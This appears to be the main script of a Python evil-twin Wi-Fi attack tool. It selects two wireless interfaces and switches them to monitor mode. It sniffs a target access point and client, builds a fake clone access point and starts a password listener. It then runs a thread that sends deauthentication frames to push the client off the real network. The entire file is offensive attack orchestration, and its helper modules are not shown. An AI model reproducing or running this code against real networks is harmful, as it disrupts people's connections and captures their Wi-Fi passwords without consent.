from Deauth import sniffWIFI, sniffClient, deauth_1, deauth
from fakeAP import start_fake_ap, authentication, association
from tools import chooseInterface, startMonitorMode
from classes import AccessPoint, StoppableThread
from APbuild import craeteNewAP
from password_handler import start_listen

interface1 = chooseInterface("choose first interface for fake AP")
interface2 = chooseInterface("choose second interface for deauth client from AP")
startMonitorMode(interface1)
startMonitorMode(interface2)

AP = sniffWIFI(interface1)

client = sniffClient(AP)

craeteNewAP(interface1, interface2, AP)
# start_fake_ap(AP, interface2)
# deauth(interface1, 400, AP.bssid, client)
deth_1 = StoppableThread(target=deauth_1, args=(AP, client, interface1))
# deth_1.start()
start_listen()
disconnect = StoppableThread(target=deauth, args=(interface1, 400, AP.bssid, client))
disconnect.start()

# authentication(AP, client, interface1)
# deth_1.stop()
# association(AP, client, interface1)
